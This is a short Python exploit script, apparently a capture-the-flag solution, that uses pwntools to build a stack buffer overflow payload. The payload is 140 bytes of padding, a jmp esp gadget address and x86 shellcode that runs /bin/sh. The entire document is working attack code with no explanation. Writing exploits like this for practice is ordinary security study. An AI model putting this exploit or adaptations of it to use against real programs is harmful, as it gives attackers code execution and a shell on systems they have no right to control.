#!/usr/bin/env python

from pwn import *

offset = 140
jmpesp = p32(0x80485a7)

shellcode = asm("""
        jmp A
B:      pop ebx
        xor ecx, ecx
        xor edx, edx
        xor eax, eax
        mov al, 0xb
        int 0x80
A:      call B
        """, arch='x86', os='linux') + '/bin/sh\x00'

payload = cyclic(offset) + jmpesp + shellcode

print payload
